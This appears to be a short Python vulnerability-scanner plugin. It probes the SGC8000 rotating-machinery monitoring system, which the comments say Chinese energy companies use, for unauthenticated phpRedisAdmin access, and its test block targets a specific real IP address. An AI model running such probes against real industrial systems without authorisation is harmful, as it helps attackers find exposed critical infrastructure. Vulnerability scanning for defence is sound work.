# -*- coding: utf-8 -*-
from dummy import *
from miniCurl import Curl
curl = Curl()
 #!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  sgc8000 大型旋转机监控系统 phpRedisAdmin未授权访问
Author    :  a
mail      :  a@lcx.cc
 
refer     :  打雷 http://www.wooyun.org/bugs/wooyun-2015-0135197/
波及各大能源公司，包括中石油，中石化，中海油，中煤等等等等全国各个化工能源公司
"""
import urlparse

def assign(service, arg):
    if service == 'sgc8000':  
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    p ="phpredisadmin/?import&s=0"
    url = arg + p
    code2, head, res, errcode, _ = curl.curl2(url)
    if (code2 ==200) and ('local server' in res):  
        security_warning(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('sgc8000', 'http://202.104.150.185/')[1])